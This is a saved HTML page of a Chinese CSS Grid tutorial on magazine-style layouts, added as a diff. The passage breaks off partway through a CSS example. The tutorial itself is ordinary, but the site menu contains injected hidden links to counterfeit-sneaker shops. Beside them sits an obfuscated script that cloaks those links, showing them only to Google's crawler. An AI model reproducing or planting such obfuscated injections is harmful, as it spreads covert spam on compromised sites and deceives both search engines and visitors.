@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<!-- saved from url=(0130)https://www.w3cplus.com/css/magazine-layouts.html?expire=1699869244&code=OUVtpBZoHPs&sign=f7315a93ce9231b8bf8c1a0b4ba574d5#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="一直以来，在 Web 布局中都是以方方正正的矩形向用户展示 UI 效果，而且众多 Web 开发者的意识中也是如此，**Web 的布局是无法打破矩形排列的限制**！但 Web 技术的发展速度是惊人的，每天都有新的东西出现在我们的眼前。就在这短短的几年时间内，用于 Web 布局的新特特别的多。换句话说，如果今天设计师跟你说：“亲，整一个类似杂志或报刊类的布局吧”！你会爽快的说 OK! 即，使用现在的新特性可以打破矩形框的限制，让你在 Web 上实现像杂志一样的排版布局。">
+<meta name="keywords" content="前端,CSS, Grid, 图解CSS, Layout, Web布局系列, 布局, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/magazine-layouts.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2759">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>图解CSS：Grid布局案例之构建杂志报刊类布局_CSS, Grid, 图解CSS, Layout, Web布局系列, 布局, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/hm.js.下载"></script><script type="text/javascript" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/jquery.min.js(2).下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2759 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/magazine-layouts.html?expire=1699869244&amp;code=OUVtpBZoHPs&amp;sign=f7315a93ce9231b8bf8c1a0b4ba574d5#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/magazine-layouts.html?expire=1699869244&amp;code=OUVtpBZoHPs&amp;sign=f7315a93ce9231b8bf8c1a0b4ba574d5#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfedavshop/beyonce-x-adidas-ivy-park-2021-winter-collection-release-date/" title="Adidas x Pharrell NMD HU Gold - adidas Nizza Platform Mid Parley Almost Blue W Release Date - SBD
+" style="display: none;">Adidas x Pharrell NMD HU Gold - adidas Nizza Platform Mid Parley Almost Blue W Release Date - SBD
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.academie-agriculture.fr/ebebdgjshop/women/zhenskaya-obuv/krossovki/120206545-krossovki-zhenskie-muzhskie-nike-dunk-low-pro-sb-bonsai-hemp-novinka" title="Украина #120206545 - nike tailwind blue ribbon sports cap white track red blue void accessories , &quot;nike dunk low pro sb bonsai hemp&quot;. новинка этого сезона! — цена 999 грн в каталоге Кроссовки ✓ Купить женские вещи по доступной цене на Шафе - Кроссовки  женские &amp; мужские
+" style="display: none;">Украина #120206545 - nike tailwind blue ribbon sports cap white track red blue void accessories , "nike dunk low pro sb bonsai hemp". новинка этого сезона! — цена 999 грн в каталоге Кроссовки ✓ Купить женские вещи по доступной цене на Шафе - Кроссовки  женские &amp; мужские
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://rwdf.cra.wallonie.be/fr/fcebdabshop/sneakers/nike-air-force-1-07-lv8-utility-white-aj7747-100-shoes-for-sale/" title="100 Shoes for Sale – Cra-wallonie Sneakers Store - all nike air zoom pegasus 32 ounce grey hair 07 LV8 Utility White AJ7747 - all nike zoom basketball shoes 2007 dodge
+" style="display: none;">100 Shoes for Sale – Cra-wallonie Sneakers Store - all nike air zoom pegasus 32 ounce grey hair 07 LV8 Utility White AJ7747 - all nike zoom basketball shoes 2007 dodge
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebcenshop/air-jordans/jordan-4/air-jordan-4-iv-retro-pure-white-metallic-silver/" title="Nike Air Jordan 9 University Red 26.5cm - Silver - IetpShops , Air Jordan 4 (IV) Pure Retro White / Metallic
+" style="display: none;">Nike Air Jordan 9 University Red 26.5cm - Silver - IetpShops , Air Jordan 4 (IV) Pure Retro White / Metallic
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfedavshop/nike-air-max-90-black-red-dx9272-001-release-date/" title="Nike Air Max 90 Black Red DX9272 , SBD - Майки для бігу nike - 001 Release Date
+" style="display: none;">Nike Air Max 90 Black Red DX9272 , SBD - Майки для бігу nike - 001 Release Date
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+              图解CSS：Grid布局案例之构建杂志报刊类布局            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2759" class="node node-blog node-promoted node-full clearfix" about="/css/magazine-layouts.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2021-10-29</span>          点击：<span>786</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/68.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/695.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Web布局系列</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/130.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">布局</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><p>一直以来，在 Web 布局中都是以方方正正的矩形向用户展示 UI 效果，而且众多 Web 开发者的意识中也是如此，<strong>Web 的布局是无法打破矩形排列的限制</strong>！但 Web 技术的发展速度是惊人的，每天都有新的东西出现在我们的眼前。就在这短短的几年时间内，用于 Web 布局的新特特别的多。换句话说，如果今天设计师跟你说：“亲，整一个类似杂志或报刊类的布局吧”！你会爽快的说 OK! 即，使用现在的新特性可以打破矩形框的限制，让你在 Web 上实现像杂志一样的排版布局。</p>
+
+<h3 class="content-title" data-index="3">杂志报刊类布局可能会用到的布局特性</h3>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-1.jpg" alt=""></p>
+
+<p>虽然我们今天要聊的主题是使用 CSS Grid 来构建杂志报刊类布局，但这并不代表着，实现这类的布局仅用 CSS Grid 特性就可以。简单地说吧，如果我们要实现上图展示的布局效果，CSS Grid 只是给了我们一些独有的优势，那是因为像 Flexbox 、浮动之类的布局只是一维布局，而 CSS Grid 却不同，他是唯一一个支持两维布局的技术，可以同时在水平和垂直方向控制元素盒子的位置。</p>
+
+<p>不过，要让 Web 布局效果更类似于杂志报刊的设计、排版效果，可能还会用到其他一些 CSS 特性，比如：</p>
+
+<ul>
+<li><strong>多列布局</strong>，可以将同一元素里内容自动分成多栏</li>
+<li><strong>CSS Regions 和 Exclusions</strong>，可以很好的解决文本围绕图片的效果，只是目前支持的浏览器非常的少</li>
+<li><strong>CSS Shapes</strong>，可以让内容在任何不规则的容器中流动，也可以围绕着任意不规则的图形排列</li>
+<li><strong>CSS Clipping 和 Masking</strong>，可以裁剪出不规则的图形或形状，也可以让元素按不规则形状展示</li>
+<li><strong>CSS 书写模式和逻辑属性</strong>，可以让文本竖排，也可以按不同的书写（阅读）方式排列</li>
+<li><strong>首字下沉</strong>，是杂志报刊类常见的一种效果，可以使用 <code>initial-letters</code> 轻易的实现首字下沉的效果</li>
+<li><strong>Web Fonts 和可变字体</strong>，可以让文本更具艺术效果，视觉更具冲击性</li>
+</ul>
+
+<blockquote>
+  <p>有关于这方面更详细的介绍，可以阅读《<a href="https://www.w3cplus.com/css/highlights-from-building-a-magazine-layout.html" target="_blank">构建杂志布局可能会用到的CSS特性</a>》一文。</p>
+</blockquote>
+
+<h3 class="content-title" data-index="3">今天的目标</h3>
+
+<p>我们今天的目标很明确，使用 CSS Grid 构建杂志报刊类布局，先从简单的开始，比如说实现下图的布局效果：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-2.jpg" alt=""></p>
+
+<p>然后在进入稍微复杂一点的布局，如下图所示：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-3.jpg" alt=""></p>
+
+<p>注意，实现上面的布局效果，CSS Grid 只是用于布局，其他的一些效果还是需要用到 CSS 的其他特性，比如多列布局，书写模式，首字下沉，Flexbox等。</p>
+
+<h3 class="content-title" data-index="3">目标一</h3>
+
+<p>目标一是 <a rel="nofollow" href="https://labs.jensimmons.com/" target="_blank">@JENSIMMONS 的 "实验室布局"</a> 首页顶部的布局效果，相对来说是很简单的。实现该效果所需的 HTML 结构也很简单：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h1</span></span>&gt;</span></span>The Experimental Layout Lab<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h1</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h2</span></span>&gt;</span></span>of Jen Simmons<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h2</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"lists"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h3</span></span>&gt;</span></span>The Conference Talks<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h3</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">ol</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">li</span></span>&gt;</span></span>
+                <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">a</span></span> <span class="attribute"><span class="attribute">href</span></span>=<span class="value"><span class="value">"#"</span></span>&gt;</span></span>Modern Layouts: Getting Out of Our Ruts<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">a</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">li</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">ol</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">ul</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"workshop"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">li</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">a</span></span> <span class="attribute"><span class="attribute">href</span></span>=<span class="value"><span class="value">"#"</span></span>&gt;</span></span>Layout Land Videos<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">a</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">li</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">ul</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"follow"</span></span>&gt;</span></span>Follow <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">a</span></span> <span class="attribute"><span class="attribute">href</span></span>=<span class="value"><span class="value">"#"</span></span>&gt;</span></span>@jensimmons<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">a</span></span>&gt;</span></span> on Twitter for more as it happens.<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>在没有任何 CSS 下，效果很粗矿：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-5.jpg" alt=""></p>
+
+<p>使用浏览器开发者工具的网格审查器，可以很快的分析出该网格的构成要素：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-4.jpg" alt=""></p>
+
+<p>暂且忽略其他的效果，仅聊 Grid。从上图中，我们可以知道这是一个 <code>5 x 5</code> （五行五列）的网格，如果把网格轨道选项也开启的话，可以知道网格轨道（行和列）的尺寸：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-6.jpg" alt=""></p>
+
+<p>即，使用 <code>grid-tempate-columns</code> 和 <code>grid-template-rows</code> 按上图所示轨道尺寸来定义每个网格轨道的尺寸：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> auto <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">0.5</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> auto <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr auto auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-7.jpg" alt=""></p>
+
+<p>正如上图所示，网格容器创建了，网格轨道尺寸和间距分配好了，接下来要做的是像 <strong>叠层布局</strong>、<strong>Full-Bleed布局</strong> 和 <strong>交叉布局</strong> 教程中介绍的类似，显式使用 <code>grid-area</code>（或其子属性 <code>grid-column</code> 和 <code>grid-row</code>）根据网格线数字索引号明确放置网格项目在网格容器中的位置：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-8.jpg" alt=""></p>
+
+<p>CSS 代码如下：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">h1</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">h2</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.lists</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">1</span></span> / span <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.workshop</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.follow</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">6</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-9.jpg" alt=""></p>
+
+<p>网格项目根据网格线名称，把相应的网格项目放置到指定位置。现在缺的只是一些美化方面的样式，比如说字体、字号、颜色等。也就是说，上面的代码，有关于网格方面的布局已完成，后面可能还会添加一些对齐相关的样式，即用于网格轨道、网格项目的对齐属性，如 <code>justify-*</code>、<code>align-*</code>、<code>*-content</code> 、<code>*-items</code> 和 <code>*-self</code>等：</p>
+
+<ul>
+<li><strong><code>justify-*</code></strong> ：
+
+<ul>
+<li>Flexbox 中主轴对齐（<code>flex-direction</code>的方向）</li>
+<li>Flexbox 只支持 <code>justify-content</code>，不支持 <code>justify-items</code> 或 <code>justify-self</code></li>
+<li>Grid 中的内联轴（Inline Axis）对齐</li>
+</ul></li>
+<li><strong><code>align-*</code></strong> ：
+
+<ul>
+<li>Flexbox 中侧轴对齐</li>
+<li>Grid 中的块轴对齐</li>
+</ul></li>
+<li><strong><code>*-content</code></strong> ：
+
+<ul>
+<li>Flex项目或网格轨道之间的空间分布</li>
+<li>没有多余的空间，这些属性什么也不做</li>
+</ul></li>
+<li><strong><code>*-items</code>，<code>*-self</code></strong> ：
+
+<ul>
+<li>网格区域内的对齐方式</li>
+<li>侧轴上的其他 Flex项目对齐</li>
+</ul></li>
+</ul>
+
+<p>CSS 网格项目中的对齐方式也是根据“盒模型对齐规范”来执行：</p>
+
+<ul>
+<li>运用于“对齐项目到块方向列轴”的对齐属性有：<code>align-items</code> 和 <code>align-self</code>，其中 <code>align-items</code> 运用于网格容器上，<code>align-self</code> 运用于网格项目上</li>
+<li>运用于“对齐项目到文本方向行轴”的对齐属性有：<code>justify-items</code> 和 <code>justify-self</code> ，其中 <code>justify-items</code> 运用于网格容器上，<code>justify-self</code> 运用于网格项目上</li>
+<li>运用于“对齐项目轨道到块方向的列轴”的对齐属性有：<code>align-content</code> ，该属性运用于网格容器上</li>
+<li>运用于“对齐项目轨道到文本方向的行轴”的对齐属性有： <code>justify-content</code> ，该属性运用于网格容器上</li>
+</ul>
+
+<p>也可以按下面这样的方式来划分：</p>
+
+<ul>
+<li>对齐网格项目：<code>justify-items</code> 和 <code>justify-self</code> 沿着行轴对齐网格项目，而 <code>align-items</code> 和 <code>align-self</code> 沿着列轴对齐网格项目，其中 <code>justify-items</code> 和 <code>align-items</code> 被运用于网格容器，而 <code>justify-self</code> 和 <code>align-self</code> 被运用于网格项目</li>
+<li>对齐网格轨道：<code>align-content</code> 沿行轴对齐网格轨道，<code>justify-content</code> 沿着列轴对齐网格轨道，它们都被运用于网格容器</li>
+</ul>
+
+<p>例如：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">h2</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end
+}</span></span></span><span class="value"></span></span></span><span class="rule"><span class="value"></span></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2110/magazine-layouts-10.jpg">
+    <source src="/sites/default/files/blogs/2021/2110/magazine-layouts-10.mp4" type="video/mp4">
+</video>
+</div>
+
+<blockquote>
+  <p>为了节约时间，我直接复制了<a rel="nofollow" href="https://labs.jensimmons.com/" target="_blank">@JENSIMMONS</a> 写的样式。</p>
+</blockquote>
+
+<p>对于竖排文本，将会使用 CSS 书写模式中的 <code>writing-mode: vertical-lr;</code>，另外对于列表项，我们采用了一个新特性 <a href="https://www.w3cplus.com/css/css-counter-style-part1.html" target="_blank"><code>@counter-style</code></a>（自定义列表项符号风格）。最终看到的效果如下：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-11.jpg" alt=""></p>
+
+<p>如果你希望让文本更具艺术范，还可以使用一些<a href="https://www.w3cplus.com/css/variable-fonts.html" target="_blank">可变字体</a>（艺术字体）：</p>
+
+<pre class="css"><code class="css"><span class="at_rule"><span class="at_rule">@<span class="keyword"><span class="keyword">font-face</span></span></span><span class="keyword"></span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-family</span></span></span><span class="rule">:<span class="value"><span class="string"><span class="value"><span class="string">'Decovar Regular24'</span></span></span><span class="value">;</span></span></span><span class="value"></span></span> 
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">src</span></span></span><span class="rule">:<span class="value"><span class="function"><span class="value"><span class="function">url(<span class="string"><span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/209981/Decovar-VF.ttf'</span></span>)</span></span></span><span class="value">;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">h1</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-family</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="string"><span class="string">"Decovar Regular24"</span></span>, sans-serif;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-weight</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">800</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-style</span></span></span><span class="rule">:<span class="value"><span class="value"> italic;</span></span></span><span class="value"></span></span>
